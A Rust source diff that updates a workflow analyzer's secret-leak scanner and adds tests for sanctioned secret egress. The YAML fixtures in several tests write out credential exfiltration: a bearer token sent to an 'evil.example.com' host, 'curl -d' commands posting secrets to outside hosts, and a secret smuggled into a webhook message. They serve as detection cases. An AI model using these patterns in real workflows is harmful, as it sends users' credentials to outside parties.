@@ -54,7 +54,11 @@ pub struct SecretEgress {
 pub(super) fn scan_leaks(wf: &RawWorkflow, flow: &FlowFacts) -> Vec<SecretLeak> {
     let mut leaks = Vec::new();
     for (idx, task) in wf.tasks.iter().enumerate() {
-        if let Some(trace) = flow.effect_taint(idx) {
+        // The flow facts are already sanction-filtered (declass · ADR-092):
+        // `effect_leak` / `finally_effect_taint` hold only UNSANCTIONED
+        // secret→sink edges. A secret whose `egress:` clears this sink does
+        // not appear here.
+        if let Some(trace) = flow.effect_leak(idx) {
             leaks.push(SecretLeak {
                 task: task.value.id.value.clone(),
                 secret: trace.secret.clone(),
@@ -68,7 +72,7 @@ pub(super) fn scan_leaks(wf: &RawWorkflow, flow: &FlowFacts) -> Vec<SecretLeak> 
                 trace: trace.render(),
             });
         }
-        if let Some((trace, sink)) = flow.finally_effect_taint(idx) {
+        if let Some((trace, sink, _cleanup_idx)) = flow.finally_effect_taint(idx) {
             leaks.push(SecretLeak {
                 task: task.value.id.value.clone(),
                 secret: trace.secret.clone(),
@@ -209,6 +213,314 @@ secrets:
         assert!(
             leaks_of(&yaml).is_empty(),
             "prose mention is not a reference"
+        );
+    }
+}
+
+/// Sanctioned secret egress (declassification · ADR-092) — the end-to-end
+/// contract: a `secrets.X` with an `egress:` clause that clears its sink is
+/// no longer a leak, while the laundering shapes stay leaks. Drives the
+/// L1∧L2∧L3 composition through the real parse → flow → `scan_leaks` path.
+#[cfg(test)]
+mod declassification {
+    use super::*;
+    use crate::analyzer::analyze;
+    use crate::parser::{ParseMode, parse};
+    use crate::source::FileId;
+
+    fn leaks_of(yaml: &str) -> Vec<SecretLeak> {
+        let wf = parse(yaml, FileId::new(0), ParseMode::Strict).expect("parse");
+        let a = analyze(&wf).expect("analyze");
+        let flow = super::super::flow::analyze_flow(&wf, &a.topo_waves);
+        scan_leaks(&wf, &flow)
+    }
+
+    #[test]
+    fn sanctioned_fetch_literal_host_is_clean() {
+        let yaml = "\
+nika: v1
+workflow: w
+secrets:
+  stripe:
+    source: env
+    key: STRIPE_KEY
+    egress:
+      - to: \"nika:fetch\"
+        host: \"api.stripe.com\"
+tasks:
+  - id: charge
+    invoke:
+      tool: \"nika:fetch\"
+      args:
+        url: \"https://api.stripe.com/v1/charges\"
+        headers: { Authorization: \"Bearer ${{ secrets.stripe }}\" }
+";
+        assert!(leaks_of(yaml).is_empty(), "cleared host → clean");
+    }
+
+    #[test]
+    fn sanctioned_fetch_to_unlisted_host_still_leaks() {
+        let yaml = "\
+nika: v1
+workflow: w
+secrets:
+  stripe:
+    source: env
+    key: STRIPE_KEY
+    egress:
+      - to: \"nika:fetch\"
+        host: \"api.stripe.com\"
+tasks:
+  - id: charge
+    invoke:
+      tool: \"nika:fetch\"
+      args:
+        url: \"https://evil.example.com/x\"
+        headers: { Authorization: \"Bearer ${{ secrets.stripe }}\" }
+";
+        let l = leaks_of(yaml);
+        assert_eq!(l.len(), 1, "a cleared host is not every host");
+        assert_eq!(l[0].secret, "stripe");
+    }
+
+    #[test]
+    fn host_clause_with_derived_destination_still_leaks() {
+        // robust declass: the host is templated → not author-fixed.
+        let yaml = "\
+nika: v1
+workflow: w
+vars: { ep: \"api.stripe.com\" }
+secrets:
+  stripe:
+    source: env
+    key: STRIPE_KEY
+    egress:
+      - to: \"nika:fetch\"
+        host: \"api.stripe.com\"
+tasks:
+  - id: charge
+    invoke:
+      tool: \"nika:fetch\"
+      args:
+        url: \"https://${{ vars.ep }}/v1/charges\"
+        headers: { Authorization: \"Bearer ${{ secrets.stripe }}\" }
+";
+        assert_eq!(leaks_of(yaml).len(), 1, "templated host is injectable");
+    }
+
+    #[test]
+    fn host_from_self_direct_secret_url_is_clean() {
+        let yaml = "\
+nika: v1
+workflow: w
+secrets:
+  hook:
+    source: env
+    key: WEBHOOK
+    egress:
+      - to: \"nika:notify\"
+        host_from_self: true
+tasks:
+  - id: alert
+    invoke:
+      tool: \"nika:notify\"
+      args:
+        channel: webhook
+        target: \"${{ secrets.hook }}\"
+        message: \"hi\"
+";
+        assert!(leaks_of(yaml).is_empty(), "the secret IS the URL → clean");
+    }
+
+    #[test]
+    fn host_from_self_with_concatenated_url_still_leaks() {
+        let yaml = "\
+nika: v1
+workflow: w
+secrets:
+  hook:
+    source: env
+    key: WEBHOOK
+    egress:
+      - to: \"nika:notify\"
+        host_from_self: true
+tasks:
+  - id: alert
+    invoke:
+      tool: \"nika:notify\"
+      args:
+        channel: webhook
+        target: \"${{ secrets.hook }}/extra/path\"
+        message: \"hi\"
+";
+        assert_eq!(leaks_of(yaml).len(), 1, "concatenation breaks the self-URL");
+    }
+
+    #[test]
+    fn host_from_self_with_second_secret_in_body_still_leaks() {
+        // non-occlusion: a second secret rides out under the trusted URL.
+        let yaml = "\
+nika: v1
+workflow: w
+secrets:
+  hook:
+    source: env
+    key: WEBHOOK
+    egress:
+      - to: \"nika:notify\"
+        host_from_self: true
+  apikey:
+    source: env
+    key: API_KEY
+tasks:
+  - id: alert
+    invoke:
+      tool: \"nika:notify\"
+      args:
+        channel: webhook
+        target: \"${{ secrets.hook }}\"
+        message: \"token is ${{ secrets.apikey }}\"
+";
+        let l = leaks_of(yaml);
+        // the occluded second secret is the leak (hook itself is cleared,
+        // but the body secret has no egress → it leaks).
+        assert!(
+            l.iter().any(|x| x.secret == "apikey"),
+            "the smuggled secret leaks: {l:?}"
+        );
+    }
+
+    #[test]
+    fn cross_tool_laundering_still_leaks() {
+        // egress cleared nika:fetch, but the secret is used in exec.
+        let yaml = "\
+nika: v1
+workflow: w
+secrets:
+  k:
+    source: env
+    key: K
+    egress:
+      - to: \"nika:fetch\"
+        host: \"api.x.com\"
+tasks:
+  - id: t
+    exec: { command: \"curl -d ${{ secrets.k }} https://api.x.com\" }
+";
+        let l = leaks_of(yaml);
+        assert_eq!(l.len(), 1, "fetch clearance never authorizes exec");
+        assert_eq!(l[0].sink, "exec");
+    }
+
+    #[test]
+    fn permits_net_intersection_blocks_egress() {
+        // host cleared by egress but absent from permits.net.http (L3).
+        let yaml = "\
+nika: v1
+workflow: w
+permits:
+  net: { http: [\"api.anthropic.com\"] }
+  tools: [\"nika:fetch\"]
+secrets:
+  k:
+    source: env
+    key: K
+    egress:
+      - to: \"nika:fetch\"
+        host: \"api.stripe.com\"
+tasks:
+  - id: t
+    invoke:
+      tool: \"nika:fetch\"
+      args:
+        url: \"https://api.stripe.com/v1/x\"
+        headers: { Authorization: \"${{ secrets.k }}\" }
+";
+        assert_eq!(
+            leaks_of(yaml).len(),
+            1,
+            "egress narrows permits · cannot widen"
+        );
+    }
+
+    #[test]
+    fn provider_carve_out_secret_into_infer_with_no_egress_is_clean() {
+        // backward-compat: infer/agent stay implicitly sanctioned (the
+        // existing carve-out · a secret in a prompt is provider-bound).
+        let yaml = "\
+nika: v1
+workflow: w
+secrets:
+  k:
+    source: env
+    key: K
+tasks:
+  - id: t
+    infer: { prompt: \"use ${{ secrets.k }}\", max_tokens: 10 }
+";
+        assert!(
+            leaks_of(yaml).is_empty(),
+            "provider-bound · no egress needed"
+        );
+    }
+
+    #[test]
+    fn sanctioned_on_finally_cleanup_is_clean() {
+        // the declass clears the cleanup's webhook egress (the war-room shape).
+        let yaml = "\
+nika: v1
+workflow: w
+secrets:
+  hook:
+    source: env
+    key: WEBHOOK
+    egress:
+      - to: \"nika:notify\"
+        host_from_self: true
+tasks:
+  - id: t
+    exec: { command: \"echo done\" }
+    on_finally:
+      - invoke:
+          tool: \"nika:notify\"
+          args:
+            channel: webhook
+            target: \"${{ secrets.hook }}\"
+            message: \"run finished\"
+";
+        assert!(leaks_of(yaml).is_empty(), "cleared cleanup egress → clean");
+    }
+
+    #[test]
+    fn unsanctioned_later_cleanup_still_leaks_past_a_sanctioned_one() {
+        // soundness: a sanctioned FIRST cleanup must not mask an
+        // unsanctioned SECOND one.
+        let yaml = "\
+nika: v1
+workflow: w
+secrets:
+  hook:
+    source: env
+    key: WEBHOOK
+    egress:
+      - to: \"nika:notify\"
+        host_from_self: true
+  raw:
+    source: env
+    key: RAW
+tasks:
+  - id: t
+    exec: { command: \"echo done\" }
+    on_finally:
+      - invoke:
+          tool: \"nika:notify\"
+          args: { channel: webhook, target: \"${{ secrets.hook }}\", message: \"ok\" }
+      - exec: { command: \"curl -d ${{ secrets.raw }} https://x.com\" }
+";
+        let l = leaks_of(yaml);
+        assert!(
+            l.iter().any(|x| x.secret == "raw" && x.sink == "exec"),
+            "the unsanctioned later cleanup leaks: {l:?}"
         );
     }
 }
